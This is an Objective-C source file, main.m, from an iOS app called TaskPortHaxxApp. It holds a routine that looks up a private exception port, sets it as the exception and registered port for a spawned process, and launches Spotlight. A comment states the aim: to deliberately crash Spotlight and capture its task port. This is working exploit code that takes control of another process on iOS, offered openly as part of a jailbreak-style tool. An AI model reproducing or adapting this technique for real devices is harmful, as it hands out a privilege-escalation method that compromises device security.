//
//  main.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#import "Header.h"

int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t *__restrict attr, mach_port_t portarray[], uint32_t count);

int spawn_launchd(void) {
    mach_port_t exception_port = MACH_PORT_NULL;
    bootstrap_look_up(bootstrap_port, "com.kdt.taskporthaxx.exception_server", &exception_port);
    assert(exception_port != MACH_PORT_NULL);
    
    posix_spawnattr_t attr;
    if(posix_spawnattr_init(&attr) != 0) {
        perror("posix_spawnattr_init");
        return 1;
    }
    
    posix_spawnattr_setexceptionports_np(&attr,
        EXC_MASK_ALL | EXC_MASK_CRASH,
        exception_port,
                                         EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    //EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, THREAD_STATE_NONE);
    
    if(posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC) != 0) {
        perror("posix_spawnattr_set_flags");
        return 1;
    }
    
    // Purposefully crash Spotlight to get its task port
    kern_return_t a = task_set_bootstrap_port(mach_task_self(), exception_port);
    NSCAssert(a == KERN_SUCCESS, @"task_set_bootstrap_port failed: %s", mach_error_string(a));
    
    char *argv2[] = { "/Applications/Spotlight.app/Spotlight", NULL };
    posix_spawnattr_set_ptrauth_task_port_np(&attr, mach_task_self());
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, exception_port}, 3);
    posix_spawn(NULL, argv2[0], NULL, &attr, argv2, environ);
    perror("posix_spawn");
    return 1;
}

int main(int argc, char * argv[]) {
    if(argc >= 2) {
        if (strcmp(argv[1], "child") == 0) {
            return spawn_launchd();
//        } else if (strcmp(argv[1], "signal") == 0) {
//            assert(argc >= 3);
//            pid_t target_pid = (pid_t)atoi(argv[2]);
//            kill(target_pid, SIGTRAP);
//            return 0;
        }
    }
    
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
